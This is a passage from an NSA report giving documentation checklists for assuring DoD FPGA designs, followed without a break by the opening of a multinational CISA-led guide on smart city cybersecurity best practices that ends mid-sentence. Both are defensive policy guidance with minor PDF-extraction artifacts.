U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Option 1: Select a different tool
The program should document each publication that
was searched, (including at minimum those identified in
this guidance) search results, the name of the person
performing the search and the date and timestamp
when the search was performed.
Option 2: Work with vendor
The program should maintain documentation regarding
the identified vulnerability, log communication with the
vendor, and document the source and method of the
received fix.
Option 3: Risk analysis
The program should maintain documentation
identifying risk, mitigations and approval authority.
To validate tools, choose one of the following options:
Use a formal 
proof
 process
Document all code that was reviewed using LEC,
document any functional discrepancies and how those
discrepancies were resolved.
Use a reproducible build process
The program should document the reproducible build
process and results validating the separate builds
produce the same binary and hash.
TD 3.5 Mitigating intrusion into the internal network
Assign Roles
The program should approve, document, and maintain
all individuals, the roles they perform, and the access
allowed by that role. At a minimum, these roles should
include design, test, network administration, and
system administration.
Control and monitor access
Entry/access to appropriate areas should be recorded,
monitored, and logged for auditability.
Research vulnerabilities
The program should document each publication that
was searched, the results of the search, vulnerabilities
and/or mitigations if applicable, name of the person
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
performing the search, and the date and timestamp of
the search.
Use a secret or classified network
The program should maintain documentation and audit
data demonstrating a network classified at the DSCA
Secret level or above. The documentation should
include a log of personnel with clearance information,
all records in accordance with a maintaining a DSCA
Secret network, as well as a documented and SSP.
TD 3.6 Mitigating risk from compromised hire or employee
Enforce auditability
The program should maintain audit logs on all design
data, including requirements, architecture, design,
code, tests, bugs, and fixes. The audit data minimally
should document who requested the change with date
and timestamp, the decision made regarding the
change, who made the decision with date and
timestamp, why was the change requested, and who
made the change with date and timestamp.
Enforce the approved design
process
The program should document and utilize the entry and
exit criteria of each stage of the design process. This
includes documentation for each peer review and
design review with roles and responsibilities along with
associated names, attendees, and findings, including
deviations or waivers and associated rationale and
approvals.
All design changes should be documented and
approved, and testing should adhere to organizationally
approved test standards.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Review critical design activities
The program should obtain the results of independent
reviews to include:
 Type and extent of verification performed, to include
evaluation objective, methodology, and tools
 Findings, both positive and negative, for all
evaluations performed
 Risks identified by the review team (e.g., quality
issues, vulnerability to threats, etc.)
 Recommendations to mitigate identified risks
 Independent team should be separate from the team
doing the design
 Identification and credentials of each reviewer
 Date and timestamp of when the review was
performed
Use cleared personnel
In writing, the program should designate work that must
be done by cleared Individuals. The program should
keep a log of personnel assigned to that work along
with their clearance level.
The program should maintain a list of the members
comprising each team with their clearance levels. The
program should maintain audit logs demonstrating what
each team member accessed.
TD 3.7 Mitigating risk associated with the compromise of device identifiers
Store device identifiers
Maintain access control logs to include who has access
to the device identifiers and who actually accesses the
device identifiers.
Limit access to device identifier
information
Maintain access control logs to include who has access
to the device identifiers and who actually accesses the
device identifiers
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Checklist for TD 4: Adversary compromises system assembly, keying,
or provisioning
TD 4 mitigations
Documentation requirements
Purchase from DoD authorized
vendors and distributors
The program should document the name and location
of the authorized vendor along with documentation
demonstrating that the vendor is authorized.
Follow storage and shipping
The program should document, maintain, and enforce
guidance
a transportation plan which supports the movement of
bulky classified material. Minimally the plan should
include:
 Title of Plan
 Date of movement
 Authorization/Approval
 Purpose
 Description of consignment, to include unique ID
when available
 Identification of responsible government and/or
company representatives
 Identification of commercial entities to be involved in
each shipment
 Packaging the consignment
 Routing of the consignment
 Couriers/escorts
 Recipient responsibilities
 Return of material procedures
 Other information as required
Provide keys and configuration
data
The program should document assembly house receipt
of data packages and the hash value of the packages.
Clear memory devices
The program should document the company, location,
individual, and method for clearing the contents along
with the contents before and after clearing.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 4 mitigations
Documentation requirements
Provision private keys
The program should document:
 The company name, location, and date of
provisioning
 The number of provisioned devices and number of
unique keys used
 Proof of DSCA facility classification
 Proof of DMEA Trust Category I certification
Protect the configuration data
package
The program should maintain data receipt
documentation from each of the assembly and test
teams showing each team either collected the data
from a central repository or received it from a trusted
transfer mechanism.
Perform verification activities
The program should maintain documentation including
the procedures used to verify the PCB traces, where
the work was performed, when it was performed, and
the results of the verification.
The program should maintain documentation including
the procedures used to authenticate the configuration
data, where the work was performed, who performed it,
when it was performed, and the results of the
verification.
The program should maintain documentation including
the authentication methodology, its architecture, and its
compliance with appropriate NIST standards.
The program should maintain documentation including
the methodology used to verify the proper keys were
loaded, where the work was performed, when it was
performed, and who performed the work.
The program should maintain documentation including
the procedures used to authenticate the post assembly
FPGA device, where the authentication was performed,
by whom, when, and the results of the verification.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 4 mitigations
Documentation requirements
Authenticate the FPGA device by choosing one option:
Option 1: Verify the unique
cryptographic ID
The program should document:
 The authenticity verification method
 The verification outcomes
 The individual name or reference ID who performed
the verification
Option 2: Verify the device on the
The program should document:
 The authenticity verification method
 The verification outcomes
 The individual name or reference ID who performed
the verification
Option 3: Use a soft PUF
The program should document:
 The authenticity verification method
 The verification outcomes
 The individual name or reference ID who performed
the verification
Checklist for TD 5: Adversary compromises third-party soft IP
TD 5 mitigations
Documentation requirements
Purchase from DoD authorized
vendors and distributors
The program should document the name and location
of the authorized vendor along with documentation
demonstrating that the vendor is authorized.
Only accept IP that is unobfuscated
The program should keep a copy of the clean
unobfuscated code, along with the name and or ID of
the person who received it.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 5 mitigations
Documentation requirements
Ensure IP deliverable packages are
digitally signed
The program should maintain documentation of the
vendor provided signature and hash, and the actual
software hash.
Validate the cryptographic hash
The program should document the value of the
calculated cryptographic hash and the signed hash
provided by the vendor along with the software name,
version, and release number.
Store IP in a revision control
repository
The program should include the initial IP and hash
check-in within the system.
Examine IP for malicious functions
The program should document all results in
accordance with Third-Party IP Review Process for
Level of Assurance 3. This document is available upon
request.
All interaction with JFAC regarding IP for malicious
functions should be documented.
To examine the IP for malicious functions, chose one of the following options:
Option 1: At least two cleared
personnel review the IP
Option 2: Contact JFAC to
determine if an IP review of the
complete IP package has been
previously completed
The program should maintain documentation specific to
that identified in the Third-Party IP Review Process for
Level of Assurance 3.
The program should maintain documentation of
correspondence between the program and JFAC. This
should include information about the IP, system the IP
is used in, and the role that IP serves within that
system, along with proof of receipt from JFAC.
The program should obtain and review evidence of IP
verification, including requirements sign-off.
Note: This activity is intended to both provide
confidence that the 3PIP will meet program
specifications and that functionality not utilized by the
developer, including testability, is understood by the
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 5 mitigations
Documentation requirements
program. Data should be created and collected by the
IP developer.
Checklist for TD 6: Adversary swaps configuration file on target
TD 6 mitigations
Documentation requirements
Incorporate cryptographic
authentication
The program should document:
 The method used to authenticate the configuration file
on load.
 The verification process used to test the
authentication method.
Authenticate configuration data
each time the data is loaded
For each configuration load method used, the program
should document the method used to authenticate the
configuration file on load, and the verification process
used to test the authentication method.
Prevent direct read back
The program should document the steps taken to
prevent direct read back of private keys.
Use a CNSS/NIST approved
algorithm and key length
The program should document the key length being
used along with the version number of the latest CNSS
or NIST FIPS guidance approved key length.
Use DoD evaluated authentication
mechanisms
The program should maintain documentation from
JFAC with the security evaluation results.
Disable test access pins
The program should maintain documentation including
the means by which the JTAG test pins were disabled.
Ensure authentication for
modifications
Document if the FPGA allows application changes, how
the vendor states authentication will apply to all
reconfiguration data, and test results indicating how
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 6 mitigations
Documentation requirements
authentication was actually applied to all
reconfiguration data.
Always program security settings
in non-volatile storage of the
device
The program should maintain documentation including
the means used to set security settings.
When a platform supports remote updates, chose one of the following options:
Option 1: Validate that the builtin application change technique
fully applies authentication to all
the reconfiguration data
The program should maintain documentation including
the test used to validate the application update
methodology and the outcome.
Option 2: Perform authentication
of the reconfiguration data in the
application
The program should maintain documentation including
the methodology used to perform authentication in the
application using partial reconfiguration.
Use a FIPS compliant 140-2 Level
2 HSM
Document how the program utilizes FIPS 140-2.
Document the HSM that is being used and the spec
sheet demonstrating FIPS compliance.
Checklist for TD 7: Adversary substitutes modified FPGA software
design suite
TD 7 mitigations
Documentation requirement
Purchase from DoD authorized
vendors and distributors
The program should document the name and location
of the authorized vendor along with documentation
demonstrating that the vendor is authorized.
Prevent automatic tool updates
The program should document, maintain, and follow
the SSP.
Use a trusted computing
environment
The program should maintain documentation and audit
data demonstrating one of the following computing
environments was used:
 A computer and network classified at the DSCA
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 7 mitigations
Documentation requirement
Secret level or above. The documentation should
include a log of personnel with clearance information,
all records in accordance with a maintaining a DSCA
Secret network, as well as a documented and SSP.
 A computer and network certified for use in a Trust
Category 1 facility as defined by DMEA.
 A network-isolated computer enclave with limited and
controlled access, adhering to NIST and CMMC
standards.
Use cleared personnel
In writing, the program should designate work that must
be done by cleared Individuals. The program should
keep a log of personnel assigned to that work along
with their clearance level.
The program should maintain a list of the members
comprising each team, with their clearance levels. The
program should maintain audit logs demonstrating what
each team member accessed.
Validate the cryptographic hash
The program should maintain the value of the
calculated hash and the hash that is provided by the
vendor, along with the version/release number and
date/timestamp.
To validate the tool output, choose one of the following options:
Option 1: Perform a logical
equivalency check
Option 2: Use a reproducible build
process
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
Document all code that was reviewed using LEC, any
functional discrepancies, and how those discrepancies
were resolved.
Document the reproducible build process and results
validating that the two separate builds produced the
same binary and hash.
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Checklist for TD 8: Adversary modifies FPGA platform family at
design
TD 8 mitigations
Engage JFAC
Documentation requirements
The program should maintain a copy of the data sent to
JFAC with a date/timestamp of when it was sent and
an acknowledgement of when it was received.
Checklist for TD 9: Adversary compromises single-board computing
system (SBCS)
TD 9 mitigations
Documentation requirement
Engage a DoD vendor to build the
SBCS
The DoD vendor should provide functionality and
product specifications.
Verification and authentication
The program should maintain a list of the members
comprising the independent verification team, with their
clearance levels. The program should maintain audit
logs demonstrating what each team member accessed,
when and what reviews were conducted, and each
device that was verified.
Authenticate the FPGA devices
The program should document the physical inspection
results for each slash sheet and unique ID for the
device inspected.
Verify the SBCS configuration
process
Document the SBCS configuration process and how it
complies with the LoA3 mitigation requirements for TD
6: Adversary swaps configuration file on target. This
includes, but is not limited to, requirements for:
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
NIST compliant authentication algorithms
Differential power analysis (DPA) resistant
authentication
Protected key storage
Anti-tamper detection and response
Being free of known vulnerabilities in the
configuration and security functions
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 9 mitigations
Documentation requirement
All encryption and authentication keys lengths
must be compliant with the requirements
outlined NIST SP 800-57
The ability to disable FPGA test pins, such as
JTAG
If the configuration file memory storage device contains
SBCS vendor code, the program should review and
evaluate that code for malicious functions, and
document how the review was conducted and any
findings. The proprietary SBCS support for
configuration must be fully understood and validated. If
the SBCS configuration process cannot be fully
evaluated, it should not be used at LoA3.
Once the SBCS
s configuration design and
implementation are evaluated to be free of malicious
functions, the program should craft a set of tests and
validation processes to verify that all the devices
comply with the evaluation. The program should
document the tests and validation processes along with
the validation of all devices.
Test non-volatile memory
Document the steps
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
The program should maintain documentation including
the FPGA settings available in the given FPGA device,
the methodology used to read them, where they were
tested, by whom, when and the results.
Document the steps taken to comply with these
requirements. This includes all hardware and software
that were authenticated and verified. All associated
data artifacts should be auditable.
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Checklist for TD 10: Adversary modifies vendor FPGA software
design suite during development
TD 10 mitigations
Documentation requirement
Perform all FPGA design work on
an isolated network
Provide documentation in alignment with Checklist for
TD 3: Adversary compromises application design cycle.
Perform logical equivalency
The program should document any hints, all
checking
optimizations, and rationale for any logic that did not
match the equivalency checker with managerial
approval signature.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
TLP:CLEAR
Cybersecurity Best Practices for
Smart Cities
Publication: April 19, 2023
United States Cybersecurity and Infrastructure Security Agency
United States National Security Agency
United States Federal Bureau of Investigation
United Kingdom National Cyber Security Centre
Australian Cyber Security Centre
Canadian Centre for Cyber Security
New Zealand National Cyber Security Centre
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information
carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for
public release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without
restriction. For more information on the Traffic Light Protocol, see cisa.gov/tlp/.
TLP:CLEAR
TLP:CLEAR
Summary
This guidance is the result of a collaborative effort from the United States Cybersecurity and
Infrastructure Security Agency (CISA), the United States National Security Agency (NSA), the
United States Federal Bureau of Investigation (FBI), the United Kingdom National Cyber
Security Centre (NCSC-UK), the Australian Cyber Security Centre (ACSC), the Canadian Centre
for Cyber Security (CCCS), and the New Zealand National Cyber Security Centre (NCSC-NZ).
These cybersecurity authorities
herein referred to as 
authoring organizations
are aware
that communities may seek cost-savings and quality-of-life improvements through the digital
transformation of infrastructure to create 
smart cities.
 In this context, the term 
smart cities
refers to communities that:
Integrate information and communications technologies (ICT), community-wide data,
and intelligent solutions to digitally transform infrastructure and optimize governance
in response to citizens
 needs.
Connect the operational technology (OT) managing physical infrastructure with
networks and applications that collect and analyze data using ICT components
such
as internet of things (IoT) devices, cloud computing, artificial intelligence (AI), and 5G.
Note: Terms that also refer to communities with this type of integration include 
connected
places,
connected communities,
 and 
smart places.
 The communities adopting smart city
technologies in their infrastructure vary in size and include university campuses, military
installations, towns, and cities.
Integrating public services into a connected environment can increase the efficiency and
resilience of the infrastructure that supports day-to-day life in our communities. However,
communities considering becoming smart cities should thoroughly assess and mitigate the
cybersecurity risk that comes with this integration. Smart cities are attractive targets for
malicious cyber actors because of:
The data being collected, transmitted, stored, and processed, which can include
significant amounts of sensitive information from governments, businesses, and
private citizens.
The complex artificial intelligence-powered software systems, which may have
vulnerabilities, that smart cities sometimes use to integrate this data.
The intrinsic value of the large data sets and potential vulnerabilities in digital systems means
there is a risk of exploitation for espionage and for financial or political gain by malicious
threat actors, including nation-states, cybercriminals, hacktivists, insider threats, and
terrorists.
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
No technology solution is completely secure. As communities implement smart city
technologies, this guidance provides recommendations to balance efficiency and innovation
with cybersecurity, privacy protections, and national security. Organizations should implement
these best practices in alignment with their specific cybersecurity requirements to ensure the
safe and secure operation of infrastructure systems, protection of citizens
 private data, and
security of sensitive government and business data.
The authoring organizations recommend reviewing this guidance in conjunction with NCSCUK
s Connected Places Cyber Security Principles, ACSC
s An Introduction to Securing Smart
Places, CCCS
s Security Considerations for Critical Infrastructure, CISA
s Cross-Sector
Cybersecurity Performance Goals, Shifting the Balance of Cybersecurity Risk: Principles and
Approaches for Security-by-Design and -Default, and Protecting Against Cyber Threats to
Managed Service Providers and their Customers.
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
Risk to Smart Cities
Smart cities may create safer, more efficient, more resilient communities through
technological innovation and data-driven decision-making; however, this opportunity also
introduces potential vulnerabilities that, if exploited, could impact national security, economic
security, public health and safety, and critical infrastructure operations. Cyber threat activity
against OT systems is increasing globally, and the interconnection between OT systems and
smart city infrastructure increases the attack surface and heightens the potential
consequences of compromise.
Smart cities are an attractive target for criminals and cyber threat actors to exploit vulnerable
systems to steal critical infrastructure data and proprietary information, conduct ransomware
operations, or launch destructive cyberattacks. Successful cyberattacks against smart cities
could lead to disruption of infrastructure services, significant financial losses, exposure of
citizens
 private data, erosion of citizens
 trust in the smart systems themselves, and physical
impacts to infrastructure that could cause physical harm or loss of life. Communities
implementing smart city technologies should account for these associated risks as part of
their overall risk management approach. The authoring organizations recommend the
following resources for guidance on cyber risk management:
An introduction to the cyber threat environment (CCCS)
Control System Defense: Know the Opponent (CISA, NSA)
Cyber threat bulletin: Cyber threat to operational technology (CCCS)
Cyber Assessment Framework (NCSC-UK)
Expanded and Interconnected Attack Surface
Integrating a greater number of previously separate infrastructure systems into a single
network environment expands the digital attack surface for each interconnected organization.
This expanded attack surface increases the opportunity for threat actors to exploit a
vulnerability for initial access, move laterally across networks, and cause cascading, crosssector disruptions of infrastructure operations, or otherwise threaten confidentiality, integrity,
and availability of organizational data, systems, and networks. For example, malicious actors
accessing a local government IoT sensor network might be able to obtain lateral access into
emergency alert systems if the systems are interconnected.
Additionally, as a result of smart cities integrating more systems and increasing connectivity
between subnetworks, network administrators and security personnel may lose visibility into
collective system risks. This potential loss of visibility includes components owned and
operated by vendors providing their infrastructure as a service to support integration. It is
critical that system owners maintain awareness and control of the evolving network topology
as well as the individuals/vendors responsible for the overall system and each segment.
Ambiguity regarding roles and responsibilities could degrade the system
s cybersecurity
posture and incident response capabilities. Communities implementing smart city technology
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
should assess and manage these risks associated with complex interconnected systems.
Risks From the ICT Supply Chain and Vendors
Communities building smart infrastructure systems often rely on vendors to procure and
integrate hardware and software that link infrastructure operations via data connections.
Vulnerabilities in ICT supply chains
either intentionally developed by cyber threat actors for
malicious purposes or unintentionally created via poor security practices
can enable:
Theft of data and intellectual property,
Loss of confidence in the integrity of a smart city system, or
A system or network failure through a disruption of availability in operational
technology.
ICT vendors providing smart city technology should take a holistic approach to security by
adhering to secure-by-design and secure-by-default development practices. Software products
developed in accordance with these practices decrease the burden on resource-constrained
local jurisdictions and increase the cybersecurity baseline across smart city networks. See the
following resource for guidance on secure-by-design and secure-by-default development
practices:
Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security-byDesign and -Default (CISA, NSA, FBI, ACSC, NCSC-UK, CCCS, BSI, NCSC-NL, CERT NZ,
NCSC-NZ)
The risk from a single smart city vendor could be much higher than in other ICT supply chains
or infrastructure operations, given the increased interdependencies between technologies and
basic or vital services. Organizations should consider risks from each vendor carefully to avoid
exposing citizens, businesses, and communities to both potentially unreliable hardware and
software and deliberate exploitation of supply chain vulnerabilities as an attack vector. This
includes scrutinizing vendors from nation-states associated with cyberattacks, or those
subject to national legislation requiring them to hand over data to foreign intelligence services.
Illicit access gained through a vulnerable ICT supply chain could allow the degradation or
disruption of infrastructure operations and the compromise or theft of sensitive data from
utility operations, emergency service communications, or visual surveillance technologies.
Smart city IT vendors may also have access to vast amounts of sensitive data from multiple
communities to support the integration of infrastructure services
including sensitive
government information and personally identifiable information (PII)
which would be an
attractive target for malicious actors. The aggregation of sensitive data may provide malicious
actors with information that could expose vulnerabilities in critical infrastructure and put
citizens at risk. See the following resources for guidance on mitigating supply chain risks:
Information and Communications Technology Supply Chain Risk Management (CISA)
Supply chain security guidance (NCSC-UK)
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
Identifying Cyber Supply Chain Risks (ACSC)
Cyber supply chain: An approach to assessing risk (CCCS)
Automation of Infrastructure Operations
Smart cities can achieve efficiencies by automating operations, such as wastewater treatment
or traffic management. Automation reduces the requirement for direct human control of those
systems. Automation can also allow for better consistency, reliability, and speed for
standardized operations. However, automation can also introduce new vulnerabilities because
it increases the number of remote entry points into the network (e.g., IoT sensors and remote
access points). The volume of data and complexity of automated operations
including
reliance on third-party vendors to monitor and manage operations
can reduce visibility into
system operations and potentially hinder real-time incident response.
Automation for infrastructure operations in smart city environments may require the use of
sensors and actuators that increase the number of endpoints and network connections that
are vulnerable to compromise. The integration of AI and complex digital systems could
introduce new unmitigated attack vectors and additional vulnerable network components.
Reliance on an AI system or other complex systems may decrease overall transparency into
the operations of networked devices as these systems make and execute operational
decisions based on algorithms instead of human judgment.
Recommendations
Secure Planning and Design
The authoring organizations strongly recommend communities include strategic foresight and
proactive cybersecurity risk management processes in their plans and designs for integrating
smart city technologies into their infrastructure systems. New technology should be deliberately
and carefully integrated into legacy infrastructure designs. Communities should ensure any
smart
 or connected features they are planning to include in new infrastructure are secure by
design and incorporate secure connectivity with any remaining legacy systems. Additionally,
communities should be aware that legacy infrastructure may require a redesign to securely
deploy smart city systems. Security planning should focus on creating resilience through
defense in depth and account for both physical and cyber risk as well as the converged cyberphysical environment that IoT and industrial IoT (IIoT) systems introduce. See the following
consolidated, baseline practices that organizations of all sizes can implement to reduce the
likelihood and impact of known IT and OT risks.
Cross-Sector Cybersecurity Performance Goals (CISA)
See the following additional resources for guidance on accounting for risks in the cyber,
physical, and converged environments:
Improving ICS Cybersecurity with Defense-in-Depth Strategies (CISA)
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
Cybersecurity and Physical Security Convergence (CISA)
Consequence-Driven Cyber-Informed Engineering (INL)
Apply the principle of least privilege.
The organizations responsible for implementing smart city technology should apply the
principle of least privilege throughout their network environments. As defined by the U.S.
National Institute of Standards and Technology (NIST), the principle of least privilege is, 
principle that a security architecture should be designed so that each entity is granted the
minimum system resources and authorizations that the entity needs to perform its function.
Administrators should review default and existing configurations along with hardening
guidance from vendors to ensure that hardware and software is only permissioned to access
other systems and data that it needs to perform its functions. Administrators should also
immediately update privileges upon changes in administrative roles or the addition of new
users or administrators from newly integrated systems. They should use a tiered model with
different levels of administrative access based on job requirements. Administrators should
limit access to accounts with full privileges across an enterprise to dedicated, hardened
privileged access workstations (PAWs). Administrators should also use time-based or just-intime privileges and identify high-risk devices, services, and users to minimize their access. For
detailed guidance, see:
Defend Privileges and Accounts (NSA)
Restricting Administrative Privileges (ACSC)
Managing and controlling administrative privileges (CCCS)
Enforce multifactor authentication.
The organizations responsible for implementing smart city technology should secure remote
access applications and enforce multifactor authentication (MFA) on local and remote
accounts and devices where possible to harden the infrastructure that enables access to
networks and systems. Organizations should explicitly require MFA where users perform
privileged actions or access important (sensitive or high-availability) data repositories. Russian
state-sponsored APT actors have recently demonstrated the ability to exploit default MFA
protocols. Organizations responsible for implementing smart cities should review configuration
policies to protect against 
fail open
 and re-enrollment scenarios. See the following resource
for guidance on implementing MFA:
#More Than a Password (CISA)
Russian State-Sponsored Cyber Actors Gain Network Access by Exploiting Default
Multifactor Authentication Protocols and 
PrintNightmare
 Vulnerability (FBI, CISA)
Transition to Multi-Factor Authentication (NSA)
MFA for online services (NCSC-UK)
Implementing MFA (ACSC)
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
Zero trust architecture design principles - Authenticate and authorize (NCSC-UK)
Implement zero trust architecture.
Implementing zero trust network design principles will create a more secure network
environment that requires authentication and authorization for each new connection with a
layered, defense-in-depth approach to security. Zero trust also allows for greater visibility into
network activity, trend identification through analytics, issue resolution through automation
and orchestration, and more efficient network security governance. See the following
resources for guidance on implementing zero trust:
Zero trust architecture design principles (NCSC-UK)
Zero Trust Maturity Model (CISA)
Embracing a Zero Trust Security Model (NSA)
A zero trust approach to security architecture (CCCS)
Zero Trust security model (CCCS)
Note: Both zero trust architecture and MFA should be applied wherever operationally feasible
in balance with requirements for endpoint trust relationships. Some OT networks may require
trust-by-default architectures, but organizations should isolate such networks and ensure all
interconnections with that network are secured using zero trust and related principles.
Manage changes to internal architecture risks.
The organizations responsible for implementing smart city technology should understand their
environment and carefully manage communications between subnetworks, including newly
interconnected subnetworks linking infrastructure systems. Network administrators should
maintain awareness of their evolving network architecture and the personnel accountable for the
security of the integrated whole and each individual segment. Administrators should identify,
group, and isolate critical business systems and apply the appropriate network security controls
and monitoring systems to reduce the impact of a compromise across the community. See the
following resources for detailed guidance:
CISA Vulnerability Scanning (CISA)
Vulnerability Scanning Tools and Services (NCSC-UK)
Security architecture anti-patterns (NCSC-UK)
Preventing Lateral Movement (NCSC-UK)
Segment Networks and Deploy Application-aware Defenses (NSA)
Securely manage smart city assets.
Secure smart city assets against theft and unauthorized physical changes. Consider
implementing physical and logical security controls to protect sensors and monitors against
manipulation, theft, vandalism, and environmental threats.
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
Improve security of vulnerable devices.
See the following resources for guidance on protecting devices by securing remote access:
Selecting and Hardening Remote Access VPN Solutions (CISA, NSA)
Using Virtual Private Networks (ACSC)
Virtual private networks (CCCS)
Protect internet-facing services.
See the following resources for guidance on protecting internet-facing services:
Protecting internet-facing services on public service CNI (NCSC-UK)
Strategies for protecting web application systems against credential stuffing attacks (CCCS)
Isolate web-facing applications (CCCS)
Patch systems and applications in a timely manner.
Where possible, enable automatic patching processes for all software and hardware devices
that include authenticity and integrity validation. Leverage threat intelligence to identify active
threats and ensure exposed systems and infrastructure are protected. Secure software assets
through an asset management program that includes a product lifecycle process. This process
should include planning replacements for components and software nearing or past end-oflife, as patches may cease to be developed by manufacturers or developers. See the following
resources for guidance on protecting systems and networks via asset management:
Known Exploited Vulnerabilities Catalog (CISA)
Asset management for cyber security (NCSC-UK)
Review the legal, security, and privacy risks associated with deployments.
Implement processes that continuously evaluate and manage the legal and privacy risks
associated with deployed solutions.
Proactive Supply Chain Risk Management
All organizations responsible for implementing smart city technology should proactively
manage ICT supply chain risk for any new technology, including hardware or software that
supports the implementation of smart city systems or service providers supporting
implementation and operations. Organizations should use only trusted ICT vendors and
components. The ICT supply chain risk management process should include participation from
all levels of the organization and have full support from program leaders implementing smart
city systems. Procurement officials from communities implementing smart city systems should
also communicate minimum security requirements to vendors and articulate actions they will
take in response to breaches of those requirements. Smart city technology supply chains
should be transparent to the citizens whose data the systems will collect and process.
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
For detailed supply chain security guidance, see:
Russian State-Sponsored and Criminal Cyber Threats to Critical Infrastructure (CISA,
ACSC, NCSC-NZ, NCSC-UK, CCCS)
Supply chain security guidance (NCSC-UK)
ICT Supply Chain Library (CISA)
Cyber-Physical Security Considerations for the Electricity Sub-Sector (CISA)
Cyber Supply Chain Risk Management (ACSC)
Software Supply Chain
The organizations responsible for implementing smart city technology should set security
requirements or controls for software suppliers and ensure that potential vendors use a
software development lifecycle that incorporates secure development practices, maintains an
active vulnerability identification and disclosure process, and enables patch management.
Product vendors should also assume some of the risk associated with their products and
develop smart city technology in adherence to secure-by-design and secure-by-default
principles and active maintenance for the products they provide. Vendors adhering to these
principles give the organizations responsible for procuring and implementing smart city
technology more confidence in the products they introduce into their networks.
For detailed guidance, see:
Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security-byDesign and -Default (CISA, NSA, FBI, ACSC, NCSC-UK, CCCS, BSI, NCSC-NL, CERT NZ,
NCSC-NZ)
Software Bill of Materials (CISA)
Supply Chain Cyber Security: In Safe Hands (NCSC-NZ)
Securing the Software Supply Chain: Recommended Practices Guide for Customers
(ODNI, NSA, CISA, CSCC, DIBSCC, ITSCC)
Coordinated Vulnerability Disclosure Process (CISA)
Protecting your organization from software supply chain threats (CCCS)
Hardware and IoT Device Supply Chain
Organizations responsible for implementing smart city technology should determine whether
the IoT devices and hardware that will enable 
smart
 functionality will require support from
third-party or external services. These organizations should perform due-diligence research on
how parts are sourced and assembled to create products. They should also determine how the
devices store and share data and how the devices secure data at rest, in transit, and in use.
Organizations should maintain a risk register that identifies both their own and their vendors
reliance on cloud computing support, externally sourced components, and similar
dependencies. For detailed guidance, see:
CISA | NSA | FBI | NCSC-UK | ACSC | CCCS | NCSC-NZ
TLP:CLEAR
TLP:CLEAR
Cyber supply chain: An approach to assessing risk (CCCS)
Cybersecurity for IOT Program (NIST)
Defending Against Software Supply Chain Attacks (CISA, NIST)
Managed Service Providers and Cloud Service Providers
Organizations should set clear security requirements for managed service providers and other
vendors supporting smart city technology implementation and operations. Organizations
should account for the risks of contracting with third-party vendors in their overall risk
management planning and ensure organizational security standards are included in
contractual agreements with external parties. Similarly, organizations should carefully review
cloud service agreements, including data security provisions and responsibility sharing
models. For detailed guidance, see:
Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Security-byDesign and -Default (CISA, NSA, FBI, ACSC, NCSC-UK, CCCS, BSI, NCSC-NL, CERT NZ,
NCSC-NZ)
Protecting Against Cyber Threats to Managed Service Providers and their Customers
(NCSC-UK, CCCS, NCSC-NZ, CISA, NSA, FBI)
Six steps toward more secure cloud computing (FTC)
Choosing the best cyber security solution for your organization (CCCS)
Operational Resilience
The organizations responsible for implementing smart city technology should develop, assess,
and maintain contingencies for manual operations of all critical infrastructure functions and
train staff accordingly. Those contingencies should include plans for disconnecting
